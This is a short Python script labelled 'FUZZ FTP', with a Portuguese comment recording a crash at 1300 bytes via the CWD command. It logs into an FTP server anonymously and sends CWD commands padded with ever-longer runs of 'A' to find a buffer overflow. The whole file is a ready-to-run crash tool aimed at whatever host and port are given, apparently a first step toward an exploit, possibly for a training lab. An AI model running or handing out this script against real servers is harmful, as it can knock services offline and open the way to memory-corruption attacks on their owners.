#!/usr/bin/python

"""
CRASH: 1300 bytes com o comando CWD
"""

import socket
import sys
import time

def banner():
	print("FUZZ FTP")


def check_arguments():
	if len(sys.argv) != 3:
		print("Missing arguments")
		print("Example: " + sys.argv[0] + " [host-ip] [port]")
		print("Usage: " + sys.argv[0] + " 192.168.0.2 21")
		exit()


def sleep_two_seconds():
	time.sleep(2)


def fuzz():
	buff = ["A"]
	count = 100

	while len(buff) <= 25:
		buff.append("A" * count)
		count += 200

	return buff


def connect(buff):
	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sck.connect((host, port))

	sleep_two_seconds()
	
	banner = sck.recv(4096)

	sck.send("USER anonymous\r\n")
	banner = sck.recv(4096)

	sck.send("PASS anonymous\r\n")
	banner = sck.recv(4096)

	sleep_two_seconds()

	sck.send("CWD " + buff + "\r\n")
	sleep_two_seconds()

def main():
	check_arguments()

	global host
	global port

	host = sys.argv[1]
	port = int(sys.argv[2])
	buffer = fuzz()

	for buff in buffer:
		buff_len = len(buff)
		print("Fuzzing with " + str(buff_len) + " bytes")
		connect(buff)


main()